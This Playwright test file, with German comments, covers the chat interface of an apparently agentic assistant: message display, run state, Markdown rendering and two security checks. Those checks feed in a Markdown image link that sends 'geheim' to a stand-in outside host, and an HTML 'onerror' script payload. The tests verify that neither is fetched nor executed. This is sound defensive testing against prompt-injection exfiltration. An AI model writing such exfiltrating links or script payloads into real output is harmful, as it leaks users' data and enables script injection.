import { expect, test, type Page } from "@playwright/test";

import { angemeldet } from "./system";

/**
 * Der Chat im Browser.
 *
 * **Was hier geprüft wird und was nicht.** Ob Textstücke fließen, hängt an
 * einem Sprachmodell; ein Gate, das ein 4,9-GB-Modell voraussetzt, läuft in
 * keiner Pipeline. Der Fluss selbst ist deshalb in der pytest-Suite gemessen
 * (``test_ereignisstrom.py``: die Stücke kommen einzeln und ergeben den Text).
 *
 * Hier geht es um das, was die Oberfläche unabhängig davon leisten muss: Was
 * gesagt wurde, steht sofort da; was das System tut, bleibt sichtbar; und der
 * Plan ist einen Klick entfernt — ein Chatfenster, das nur Text zeigt,
 * verbirgt, was gerade geschieht.
 */
test("Gesagtes erscheint sofort, mit sichtbarem Zustand", async ({ page }) => {
  await angemeldet(page);

  await page.getByTestId("eingabe").fill("Wie spät ist es?");
  await page.getByTestId("senden").click();

  const wortwechsel = page.getByTestId("wortwechsel").first();
  await expect(wortwechsel.getByTestId("gesagt")).toContainText("Wie spät ist es?");
  // Ohne laufendes Modell bleibt der Lauf stehen — und die Oberfläche sagt
  // das, statt eine leere Antwort zu zeigen.
  await expect(wortwechsel.getByTestId("geantwortet")).toContainText(/arbeitet|wartet/);
});

test("Der Plan bleibt einen Klick entfernt", async ({ page }) => {
  await angemeldet(page);
  await page.getByTestId("eingabe").fill("Blockier mir eine Stunde");
  await page.getByTestId("senden").click();
  await expect(page.getByTestId("wortwechsel").first()).toBeVisible();

  await page.getByTestId("zum-lauf").first().click();

  await expect(page.getByTestId("laufliste")).toBeVisible();
});

/**
 * Legt der Oberfläche eine fertige Modellantwort vor.
 *
 * Nachgestellt wird die **Antwort**, nicht die Prüfung: Was ein Modell
 * schreibt, hängt vom Modell ab, und ein Gate, das ein 4,9-GB-Modell
 * voraussetzt, läuft in keiner Pipeline. Wie die Oberfläche mit einem
 * gegebenen Text umgeht, ist davon unabhängig — und genau das ist hier die
 * Frage.
 */
async function mitAntwort(page: Page, output: string): Promise<void> {
  await page.route("**/runs", async (route) => {
    if (route.request().method() !== "GET") return route.fallback();
    await route.fulfill({
      status: 200,
      contentType: "application/json",
      body: JSON.stringify([
        {
          id: "11111111-1111-1111-1111-111111111111",
          status: "completed",
          trigger: "user",
          taint_level: "clean",
          data_class: "p2",
          intent: null,
          is_multi_step: false,
          trace_id: "t",
          started_at: new Date().toISOString(),
          finished_at: new Date().toISOString(),
          goal: "Lies die Notiz",
          output,
          plan: [],
        },
      ]),
    });
  });
  await page.reload();
}

test("Markdown wird ausgezeichnet dargestellt", async ({ page }) => {
  await angemeldet(page);
  await mitAntwort(
    page,
    "## Ergebnis\n\nZwei Termine:\n\n- heute\n- morgen\n\n| Zeit | Ort |\n|---|---|\n| 9:00 | Büro |\n\n`code`",
  );

  const antwort = page.getByTestId("geantwortet").first();
  await expect(antwort.locator("h2")).toHaveText("Ergebnis");
  await expect(antwort.locator("li")).toHaveCount(2);
  await expect(antwort.locator("table td").first()).toHaveText("9:00");
  await expect(antwort.locator("code")).toHaveText("code");
});

test("Ein Bild in der Antwort wird nicht geholt", async ({ page }) => {
  await angemeldet(page);

  // **Die Lücke, die die HTML-Regel offen lässt.** ``![](…)`` ist gültiges
  // Markdown; der Browser holt die Adresse ohne Zutun ab. In einem Lauf, der
  // Fremdinhalt tragen kann, wäre das ein Ausleitungskanal — die Adresse
  // trägt, was das Modell hineinschreibt. Gemessen wird deshalb der
  // **Netzverkehr**, nicht das Markup: Ob ein Element entsteht, ist die
  // Vermutung; ob eine Anfrage rausgeht, ist die Wirkung.
  const abrufe: string[] = [];
  page.on("request", (anfrage) => {
    if (anfrage.url().includes("fremder-rechner.example")) abrufe.push(anfrage.url());
  });

  await mitAntwort(page, "![Beleg](https://fremder-rechner.example/spur.png?d=geheim)");

  const antwort = page.getByTestId("geantwortet").first();
  await expect(antwort.getByTestId("bildverweis")).toContainText("Beleg");
  expect(await antwort.locator("img").count()).toBe(0);
  expect(abrufe).toEqual([]);
});

test("Der Antworttext wird als Text dargestellt, nicht als HTML", async ({ page }) => {
  await angemeldet(page);

  // Nachgestellt wird eine Modellantwort mit HTML darin — der Weg, den eine
  // präparierte Datei oder Mail nähme. Gerendert werden darf sie nur als Text;
  // ein ``dangerouslySetInnerHTML`` an dieser Stelle wäre der direkte Pfad in
  // eine Anwendung mit Postfachzugriff.
  await mitAntwort(page, '<img src=x onerror="window.__geknackt=1"> <b>fett</b>');

  const antwort = page.getByTestId("geantwortet").first();
  await expect(antwort).toContainText("<b>fett</b>");
  expect(await page.evaluate(() => (window as never as Record<string, unknown>).__geknackt)).toBeUndefined();
  expect(await antwort.locator("img").count()).toBe(0);
});
